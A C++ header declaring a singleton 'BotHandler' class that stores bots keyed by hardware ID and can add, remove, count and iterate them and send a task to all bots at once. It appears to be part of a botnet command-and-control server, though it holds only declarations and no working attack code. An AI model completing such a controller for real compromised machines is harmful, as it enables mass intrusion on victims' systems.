#pragma once

#include <iostream>
#include <map>
#include <utility>

#include "../Task/Task.h"
#include "Bot.h"

class BotHandler {
private:
  typedef std::map<std::string, class Bot *> BotMap;
  typedef BotMap::iterator BotMapIter;
  typedef std::pair<std::string, class Bot *> BotMapPair;

  BotMap BotList;

  static BotHandler *Instance;

public:
  static BotHandler *getInstance();

  void addBot(class Bot *bot);
  void removeBot(std::string *HWID);
  Bot *getBot(std::string *HWID);

  void addTaskToAllBots(class Task *task);

  int getBotCount();

  BotHandler::BotMapIter getBotListIteratorBegin();
  BotHandler::BotMapIter getBotListIteratorEnd();
};
